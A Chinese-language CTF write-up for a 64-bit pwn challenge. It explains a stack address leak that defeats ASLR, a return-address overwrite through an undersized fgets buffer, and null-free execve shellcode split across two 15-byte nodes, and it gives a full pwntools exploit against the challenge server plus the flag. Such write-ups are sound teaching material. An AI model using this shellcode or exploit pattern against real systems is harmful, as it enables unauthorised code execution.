# CTF 深度解析：奪取_茅利塔尼亞 - Shellcode (PWN)

| 屬性 | 規格 |
| :--- | :--- |
| **難度分級** | Medium |
| **核心漏洞** | 緩衝區溢位 (Buffer Overflow), 記憶體位址洩漏 (Information Leak) |
| **防禦機制** | amd64 (64-bit), PIE Enabled, Stack Executable (有 RWX 段) |
| **關鍵限制** | 輸入長度極短 (15 bytes)、`strncpy` 的 Null-Byte (`\x00`) 截斷 |
| **關鍵工具** | `objdump`, `pwntools`, `nc`, `python3` |

---

## 1. 靜態分析：尋找破口與致命限制

這是一題看似簡單，卻處處充滿限制的 Shellcode 題。程式碼主要由 `main`, `nononode`, `printNode`, `readline` 與 `goodbye` 組成。

### A. 友善的位址洩漏 (ASLR Bypass)
在 `printNode` 函數中，程式透過 `printf` 印出了 Node 1 的 `next` 指標（該指標指向 Node 2 的位址）。
因為 Node 2 建立在堆疊 (Stack) 上，這直接洩漏了堆疊的真實記憶體位址，讓我們能完美無視 PIE 和 ASLR 的防護，精準計算出 Shellcode 所在的絕對位址。

### B. 嚴苛的空間與字元限制
在 `readline` 函數中，程式使用了 `strncpy(dest, src, 0xf)`。這帶來了兩個地獄級的限制：
1. **極限空間**：每個 Node 最多只能存 **15 bytes** 的資料，連最基本的 `execve("/bin/sh")` (通常 >22 bytes) 都塞不下。
2. **Null-Byte 截斷**：`strncpy` 只要遇到 `\x00` 就會立刻停止複製。我們的 Shellcode 中絕對不能有任何 `\x00` 機器碼產生。

---

## 2. 漏洞剖析：致命的 Return Address 劫持

這題的核心漏洞藏在程式即將結束的 `goodbye` 函數中。

### 緩衝區溢位 (Buffer Overflow)
`goodbye` 宣告了一個極小的區域變數，卻用 `fgets` 讀取過長的大小：
```nasm
lea    rax, [rbp-0x3]   ; 緩衝區只有 3 bytes
mov    esi, 0x20        ; 卻允許讀取 32 bytes
call   <fgets@plt>
```



### 棧空間佈局 (Stack Layout)
| 位址 | 內容 | 說明 |
| :--- | :--- | :--- |
| `rbp + 8` | **Return Address (RIP)** | **目標覆蓋位址 (距離輸入點 11 bytes)** |
| `rbp + 0` | Saved RBP | 8 bytes (會被我們蓋掉) |
| `rbp - 3` | **Buffer** | **輸入起點 (`fgets` 讀取 32 bytes)** |

**結論：** 我們只需要輸入 `3 bytes (填滿 Buffer) + 8 bytes (蓋掉 RBP) = 11 bytes` 的垃圾字元，接下來的 8 bytes 就能精準覆蓋 Return Address，將執行流程導向我們的 Shellcode。

---

## 3. 攻擊策略：零空字元 (Null-Free) 雙節棍 Shellcode

因為 15 bytes 塞不下完整的 Payload，我們必須將 Shellcode 拆成兩半，分別放進 Node 2 和 Node 1，並用 `jmp` 指令串接。同時，為了繞過 `strncpy` 的截斷以及讓 `execve` 順利讀取字串，我們使用了非常精密的暫存器操作。

### A. Node 2: 字串準備與跳轉 (恰好 15 bytes)
負責將字串結尾的 `\x00` 和 `//bin/sh` 推入堆疊，然後短跳轉到 Node 1。
```nasm
xor esi, esi                ; [2 bytes] rsi = 0
push rsi                    ; [1 byte]  推入 0 作為字串的 Null Terminator!
mov rbx, 0x68732f6e69622f2f ; [10 bytes] 將 "//bin/sh" 放入暫存器 (避免記憶體中有 \x00)
jmp node1                   ; [2 bytes]  跳轉至 node 1 繼續執行
```

### B. Node 1: 參數設定與系統呼叫 (9 bytes)
負責將字串指標放進 `rdi`，設定系統呼叫號碼，並完美清空環境變數指標。
```nasm
push rbx                    ; [1 byte] 將 "//bin/sh" 推入堆疊
push rsp                    ; [1 byte] 取得字串指標
pop rdi                     ; [1 byte] rdi = 指向 "/bin/sh" 的指標
push 59                     ; [2 bytes] execve 的 syscall 號碼
pop rax                     ; [1 byte] rax = 59
cdq                         ; [1 byte] 神奇指令：用 eax 擴展 edx，因為 eax 是正數，所以 rdx = 0
syscall                     ; [2 bytes] 觸發系統呼叫！拿 Shell！
```

---

## 4. Exploit 實作 (pwntools)

```python
from pwn import *

context.arch = 'amd64'

r = remote('140.117.80.61', 4443)

# 1. 組裝雙節棍 Shellcode
shellcode_asm = '''
node2:
    xor esi, esi
    push rsi
    mov rbx, 0x68732f6e69622f2f
    jmp node1
.space 32 - (. - node2)
node1:
    push rbx
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    syscall
'''
full_sc = asm(shellcode_asm)
sc_node2 = full_sc[:15]
sc_node1 = full_sc[32:32+9].ljust(15, b'\x90')

# 2. 寫入 Node 資料
r.sendlineafter(b'node 1:', sc_node1)
r.sendlineafter(b'node 2:', sc_node2)

# 3. 擷取洩漏的記憶體位址 (ASLR Bypass)
r.recvuntil(b'node.next: ')
leak_addr = int(r.recvline().strip(), 16)
target_addr = leak_addr + 8 # Node 2 buffer 偏移量

# 4. 觸發 Buffer Overflow 劫持 RIP
payload = b'A' * 11 + p64(target_addr)
r.sendlineafter(b'initials?', payload)

# 5. 取得控制權
r.interactive()
```

---

## 5. 反思與總結

這題「奪取_茅利塔尼亞」非常考驗對組合語言的掌握度。它教會了我們兩件 PWN 的核心技巧：
1. **Shellcode Golfing**：當空間極度受限時，善用 `cdq` (1 byte 清空 rdx)、`push/pop` 來取代長度較長的 `mov` 指令。
2. **Null-Free 技巧**：遇到字串複製函數 (如 `strcpy`, `strncpy`) 時，絕對不能將字串寫死在 `.data` 區段或使用包含 `\x00` 的指令。利用暫存器存取 Hex 字串再 `push` 到堆疊上是繞過此限制的萬用解法。

**🚩 FLAG: `FLAG{M355_w1th_n0d3}`**